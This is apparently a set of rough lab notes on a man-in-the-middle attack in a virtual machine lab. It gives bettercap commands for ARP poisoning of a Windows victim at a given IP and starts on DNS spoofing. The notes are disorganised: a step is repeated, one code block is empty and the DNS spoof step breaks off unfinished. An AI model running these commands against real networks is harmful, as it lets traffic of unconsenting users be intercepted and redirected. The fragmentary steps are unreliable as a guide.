We are going to perform DNS spoof attack using **bettercap** tool ------

## Step 1 : First we have to perform Arp-Poisoning atttack with the victim machine (Using bettercap tool)

How to Perform (In VM):

We have two machines **Kali** (Attacker)  and  **Windows** (Victim)  machines.

```
sudo bettercap --iface eth0

net.probe on

arp.spoof on

set arp.spoof.targets 192.168.229.132

```

--------------

Step 2 : 















```

--------

## Step 2 : Start bettercap tool and perform

```
sudo bettercap --iface eth0
```

```
help

help dns.spoof

set dns.spoof.add
```

